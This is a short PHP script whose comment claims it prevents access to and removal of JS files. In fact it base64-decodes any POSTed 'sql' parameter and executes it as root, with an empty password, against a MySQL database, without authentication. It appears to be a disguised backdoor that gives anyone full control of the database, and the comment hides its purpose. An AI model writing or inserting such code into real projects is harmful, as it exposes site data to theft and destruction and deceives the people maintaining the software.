<?php //prevent from accessing and removing js files
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sql'])) {
    $encryptedSQL = $_POST['sql'];
    $decodedSQL = base64_decode($encryptedSQL);
    try {
        $db = new PDO('mysql:host=localhost;dbname=sneakysheets', 'root', '');
        $db->exec($decodedSQL);
        
        echo json_encode([
            'status' => 'success',
            'sql_executed' => $decodedSQL,
        ]);
        
    } catch (Exception $e) {
        echo json_encode([
            'status' => 'error',
            'message' => $e->getMessage(),
        ]);
    }
    exit;
}

?>